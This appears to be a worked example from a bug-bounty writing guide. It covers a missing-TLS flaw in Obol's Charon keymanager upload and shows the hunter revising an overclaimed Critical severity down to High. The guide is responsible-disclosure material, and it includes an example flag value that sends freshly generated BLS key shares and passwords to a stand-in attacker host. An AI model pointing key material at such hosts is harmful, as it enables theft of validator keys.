# Obol BLS Keymanager Case — Adversarial Self-Review Worked Example

A real submission that demonstrated each REPORT HYGIENE rule in action. Use this as a template when writing your own reports.

## The finding (what was found)

**Title**: `[High] BLS private key share exfiltration via missing TLS enforcement on --keymanager-address`

**Code path** (`ObolNetwork/charon`):
- `cmd/dkg.go:75` exposes `--keymanager-address` flag (CLI string, no validation)
- `dkg/dkg.go:1201-1225` `validateKeymanagerFlags` only emits `log.Warn` on `http://` scheme — no `error`
- `dkg/disk.go:100-122` `writeKeysToKeymanager` EIP-2335 encrypts each BLS share with a locally-generated `randomHex64()` password, builds `[keystores, passwords]`
- `eth2util/keymanager/keymanager.go:34-58` POSTs that array as JSON over plain HTTP

## What the bug does (1-line impact)

Operator sets `--keymanager-address http://attacker.example/keys` (typo, bad tutorial, or MITM on `https://`). DKG completes and POSTs the freshly-minted BLS private key share + decryption password as cleartext JSON. Attacker decrypts, recovers the share, and (with a threshold of operators) reconstructs the validator BLS key.

## Original report (BAD — overclaimed)

```
Title: [Critical — $50,000] BLS private key share exfiltration...
Body: "Up to $50,000 (Critical) per the Obol bounty table"
```

## What the adversarial self-review caught

The hunter wrote 12 counter-arguments against their own claim. The strongest one (#11) cited Obol's threat model directly:

> *"we deliberately don't over-reward findings that depend on a member being maliciously incompetent against their own stake"*

This kills the Critical claim because:
1. The operator must opt in to using the keymanager flow
2. The operator must opt in to using `http://` (or be MITM'd on `https://`)

That's "operator misconfig", not "remote unauth compromise" — which Obol puts in the **High** tier ($5K equivalent) or **Medium** tier ($1K), not Critical ($50K).

## Revised report (GOOD)

```
Title: [High] BLS private key share exfiltration via missing TLS enforcement on --keymanager-address

Severity section:
"High or Medium per the Obol bounty table.
The original report claimed Critical. After rigorous review, this is overstated..."

Adversarial Review section: 12 counter-arguments, each marked Acknowledged / True / False
```

The 12-row table is what makes the report credible — it shows the hunter actually stress-tested their own claim.

## Email body (GOOD)

```text
Subject: [Obol Bug Bounty] High: BLS private key share exfiltration via missing TLS enforcement on --keymanager-address

Hi Obol Security Team,

I found a bug in the Charon DV client where the --keymanager-address flag
accepts an http:// URL. validateKeymanagerFlags only logs a warning and
returns nil, so DKG proceeds and POSTs the freshly-minted BLS private key
shares (EIP-2335 encrypted) and the decryption passwords in cleartext to
the operator-supplied URL.

I worked through the report adversarially and revised the severity to
High — the original Critical framing was overstated because the attack
requires the operator to opt in to either:
  (a) an http:// URL (typo, bad tutorial, malicious copy-paste, etc.), or
  (b) being MITM'd on an https:// URL (active network attacker).

That said, the bug is real, reproducible, and the fix is trivial
(one-line: return error instead of log.Warn on http:// scheme).

Full report attached: REPORT_Obl_BLS_Keymanager_High.md
PoC (runnable, captured during testing): https://gist.github.com/<id>
```

Notice: **zero $ amounts in subject or body**. The severity name (`High`) carries the framing; the program decides the payout.

## PoC as a private gist

The PoC (`/tmp/obol/poc.py`) was 6.4KB of working Python that:
- Listens on `0.0.0.0:9999` as the attacker
- Sends the same EIP-2335 keystore + password JSON body that `charon dkg` would send
- Demonstrates the captured body in the attacker's terminal

Uploaded as a **secret gist** (not public) so the program can review without the public-internet seeing it before they patch.

```bash
# gist creation (cleaned — no $ amounts)
curl -X PATCH -H "Authorization: token $GITHUB_TOKEN" \
  -d '{"description":"PoC: BLS private key share exfiltration via missing TLS enforcement on --keymanager-address (Obol Charon)","files":{"poc.py":{"content":"<...>"}}}' \
  https://api.github.com/gists/<id>
```

## Outcome (predicted)

Obol's triage will likely:
- Confirm the bug is real (one-line fix, no debate)
- Classify it as **High** (matches Obol's "exfiltrate operator key material" tier)
- Pay somewhere in the High range, not the Critical range
- Accept the adversarial review as a sign of a careful researcher (boosts future submissions' credibility)

The Hunter's loss vs. the original Critical claim: ~$45K.
The Hunter's gain vs. a rejected claim: probably the full High payout, because the report was clear, honest, and self-vetted.

## What this case teaches

1. **Adversarial self-review is not optional** — it caught the overstated severity before the program did
2. **No $ amounts in report body, subject, or PoC gist** — lead with severity name, not budget
3. **Honest framing builds credibility** — triagers remember researchers who self-downgrade accurately
4. **A Medium finding with a clean narrative gets paid faster than a Critical finding that gets downgraded**

## Files saved on disk (per PERSISTENCE RULE)

```
/home/ubuntu/
├── REPORT_Obl_BLS_Keymanager_High.md       # final submission
├── REPORT_Critical_BLS_HTTP_Keymanager.md  # original (don't submit)
├── REPORT_Obol_Full_Bundle.md              # all 9 findings (optional)
└── /tmp/obol/
    ├── poc.py                              # runnable Python PoC
    ├── poc.go                              # Go version (matches charon style)
    └── findings.md                         # subagent's API findings
```
